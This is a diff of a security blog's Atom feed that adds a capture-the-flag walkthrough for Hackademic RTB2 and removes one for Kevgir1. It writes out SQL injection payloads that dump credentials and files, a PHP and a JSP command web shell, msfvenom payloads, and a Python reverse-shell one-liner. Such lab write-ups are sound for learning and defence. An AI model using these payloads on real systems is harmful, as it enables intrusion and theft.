@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-08-03T14:39:54-05:00</updated>
+  <updated>2016-08-12T13:04:45-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,207 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Hackademic RTB2]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/10/hackademic-rtb2/"/>
+    <updated>2016-08-10T15:38:10-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/10/hackademic-rtb2</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>Netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Joomscan</li>
+<li>Metasploit</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.158 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.158 -p-</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like port 80 is opening and port 666 is filtered.</p>
+
+<p>Use both wfuzz to scan the host</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find <code>phpmyadmin</code></p>
+
+<p>check the webpage, and need to login, try to use sqli to by pass the autherication, but doesn&rsquo;t work. Now step back, enumerate more.</p>
+
+<p>I use nmap to scan the target again. find port 666 now is opening. So there may be a port knocking existing.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use wfuzz scan again</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158:666/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the webpage <code>http://192.168.41.158:666/</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like it is joomla</p>
+
+<p>now use Joomba to scan the app</p>
+
+<p><code>joomscan -u http://192.168.41.158:666/</code></p>
+
+<p>nothing cool comes out.</p>
+
+<p>use metasploit</p>
+
+<p><code>search joomla</code></p>
+
+<p>I use <code>auxiliary/scanner/http/joomla_plugins</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/http/joomla_plugins
+</span><span class='line'>msf auxiliary(joomla_plugins) &gt; set rhosts 192.168.41.158
+</span><span class='line'>msf auxiliary(joomla_plugins) &gt; set rport 666
+</span><span class='line'>msf auxiliary(joomla_plugins) &gt; run</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use <code>/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>
+
+<p>so first step, verify the sql injection:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>then try to get column number:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 1--</code>
+<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 2--</code>
+<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 3--</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>the column number is 2</p>
+
+<p>next find out which column we can use</p>
+
+<p><code>158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,2--</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Okay. Column 2</p>
+
+<p>try to check mysql version</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,@@version--</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get all table name</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, table_name from information_schema.tables--</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get all column name of table jos_users</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, column_name from information_schema.columns where table_name = 'jos_users'--</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next, get column username and password:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, concat(username,0x20,password) from jos_users--</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The format is hash:salt</p>
+
+<p>use my previous joomla hash crack script <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./crackjoomla.py 992396d7fc19fd76393f359cb294e300 70NFLkBrApLamH9VNGjlViJLlJsB60KF /usr/share/wordlists/rockyou.txt </span></code></pre></td></tr></table></div></figure>
+
+
+<p>for administrator, I didn&rsquo;t get the password</p>
+
+<p>for JSmith, password is matrix, for BTallor, password is victim.</p>
+
+<p>login using JSmith, find nowhere can upload the webshell. check the configuration.php file</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, load_file('/var/www/configuration.php')--</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find the username/password. Use it login phpmyadmin</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now I will create a backdoor using mysql:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>create database pwn;
+</span><span class='line'>create table backdoor(script text);
+</span><span class='line'>insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
+</span><span class='line'>select * into outfile "/var/www/shells.php" from backdoor;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>check the backdoor.</p>
+
+<p><code>http://192.168.41.158:666/backdoor3.php?cmd=uname -a</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>good.</p>
+
+<p>Setup netcat and</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.41.158:666/backdoor3.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>uname -a</code></p>
+
+<p>find the kernel version is 2.6.32. Find an exploit Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/rtb2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[hackademic:rtb1]]></title>
@@ -62,7 +263,7 @@
 <p>use wfuzz to scan:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.157/Hackademic_RTB1//FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.157/Hackademic_RTB1/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
 
 
 <p><img src="http://wg135.github.io/images/blog/vulhub/rtb1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
@@ -4700,212 +4901,6 @@ gcc 764.c -o 764 -lcrypto
 <p>Now the sqlmap dump all items I created.</p>
 
 <p>DONE</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[vulhub:kevgir1]]></title>
-    <link href="http://wg135.github.io/blog/2016/05/02/vulhub-kevgir1/"/>
-    <updated>2016-05-02T14:42:52-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/05/02/vulhub-kevgir1</id>
-    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/kevgir-1,137/">Vulhub</a></p>
-
-<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>hydra</li>
-<li>msfvenom</li>
-<li>joomscan</li>
-</ul>
-
-
-<!--more-->
-
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.174 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.79.174 -p-</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Let attack ftp now.</p>
-
-<p><code>hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt  -u  -s 25 192.168.79.174 ftp</code></p>
-
-<p>get the user name and password</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>try ssh using same username and password</p>
-
-<p><code>ssh -p 1322 admin@192.168.79.174</code></p>
-
-<p>FTP attack DONE</p>
-
-<p>Now it is privilege escalation time</p>
-
-<p><code>uname -a</code>, get the result:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><code>searchsploit 14.04</code>
-<img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>try <code>/linux/local/37292.c</code>, copy it to /var/www/html/, use wget to download to target machine, then compile it.</p>
-
-<p><code>gcc 37292.c -o attack -static</code>, then run <code>attack</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>failed, now try harder.</p>
-
-<p>In the searchsploit result, there is a 39166.c. Lets try this one.</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>GET the ROOT!!</p>
-
-<p>Now let&rsquo;s attack port 8080. Use nikto to scan it first.</p>
-
-<p><code>nikto -h 192.168.79.174:8080</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>We got the username and password for tomcat manager &hellip; good</p>
-
-<p>log into the manager page and now we can upload webshell&hellip;.</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>create webshell(from pentester lab, you may generate it using msfvenom)</p>
-
-<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">FORM</span> <span class="nx">METHOD</span><span class="o">=</span><span class="nx">GET</span> <span class="nx">ACTION</span><span class="o">=</span><span class="s1">&#39;index.jsp&#39;</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">INPUT</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;cmd&#39;</span> <span class="nx">type</span><span class="o">=</span><span class="nx">text</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">INPUT</span> <span class="nx">type</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;Run&#39;</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="nx">FORM</span><span class="o">&gt;</span>
-</span><span class='line'><span class="o">&lt;%@</span> <span class="nx">page</span> <span class="nx">import</span><span class="o">=</span><span class="s2">&quot;java.io.*&quot;</span> <span class="o">%&gt;</span>
-</span><span class='line'><span class="o">&lt;%</span>
-</span><span class='line'>   <span class="nx">String</span> <span class="nx">cmd</span> <span class="o">=</span> <span class="nx">request</span><span class="o">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">);</span>
-</span><span class='line'>   <span class="nx">String</span> <span class="nx">output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
-</span><span class='line'>   <span class="k">if</span><span class="p">(</span><span class="nx">cmd</span> <span class="o">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="nx">String</span> <span class="nx">s</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
-</span><span class='line'>      <span class="k">try</span> <span class="p">{</span>
-</span><span class='line'>         <span class="nx">Process</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">Runtime</span><span class="o">.</span><span class="nx">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="nb">exec</span><span class="p">(</span><span class="nx">cmd</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">);</span>
-</span><span class='line'>         <span class="nx">BufferedReader</span> <span class="nx">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BufferedReader</span><span class="p">(</span><span class="k">new</span> <span class="nx">InputStreamReader</span><span class="p">(</span><span class="nx">p</span><span class="o">.</span><span class="nx">getInputStream</span><span class="p">()));</span>
-</span><span class='line'>         <span class="k">while</span><span class="p">((</span><span class="nx">s</span> <span class="o">=</span> <span class="nx">sI</span><span class="o">.</span><span class="nx">readLine</span><span class="p">())</span> <span class="o">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span> <span class="nx">output</span> <span class="o">+=</span> <span class="nx">s</span><span class="o">+</span><span class="s2">&quot;&lt;/br&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
-</span><span class='line'>      <span class="p">}</span>  <span class="k">catch</span><span class="p">(</span><span class="nx">IOException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>   <span class="nx">e</span><span class="o">.</span><span class="nx">printStackTrace</span><span class="p">();</span>   <span class="p">}</span>
-</span><span class='line'>   <span class="p">}</span>
-</span><span class='line'><span class="o">%&gt;</span>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;%=</span><span class="nx">output</span> <span class="o">%&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>now pack the webshell</p>
-
-<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nb">mkdir</span> <span class="nx">webshell</span>
-</span><span class='line'><span class="nx">cp</span> <span class="nx">index</span><span class="o">.</span><span class="nx">jsp</span> <span class="nx">webshell</span>
-</span><span class='line'>
-</span><span class='line'><span class="nx">cd</span> <span class="nx">webshell</span>
-</span><span class='line'><span class="nx">jar</span> <span class="o">-</span><span class="nx">cvf</span> <span class="o">../</span><span class="nx">webshell</span><span class="o">.</span><span class="nx">war</span> <span class="o">*</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>now upload the webshell.war. After uploading, visit page  <code>192.168.79.174:8080/webshell/</code>.</p>
-
-<p>get the shell</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Lets use msfvenom to create webshell</p>
-
-<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.173 LPORT=4444 -f war &gt; webshell1.war</code></p>
-
-<p>upload webshell1.war and setup netcat listening on port 4444. After connection is setup. do <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
-
-<p>get the shell</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE for Tomcat</p>
-
-<p>Now move to port 8081</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Its Joomla!.</p>
-
-<p>use tool <code>joomscan</code> to scan it</p>
-
-<p><code>joomscan -u http://192.168.79.174:8081</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>get the version of joomla!</p>
-
-<p>Now find out the vulnerability:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>follow the instructions of this vulnerability.</p>
-
-<p>login as admin:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>create php reverse shell:</p>
-
-<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.173 LPORT=6666 -e php/base64 -f raw &gt; shell.php</code></p>
-
-<p>In Extension ->Template Manager, edit existing template. Copy the content of the shell.php to it and don&rsquo;t forgot to add &lt;?php and ?>.</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>set up the netcat and preview the page. get the shell</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now lets try another php webshell</p>
-
-<p><a href="https://github.com/wg135/webshell-1/blob/master/php/reverseshell-poc.txt">reverse shell from hacksys team</a></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/gameover.jpg" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
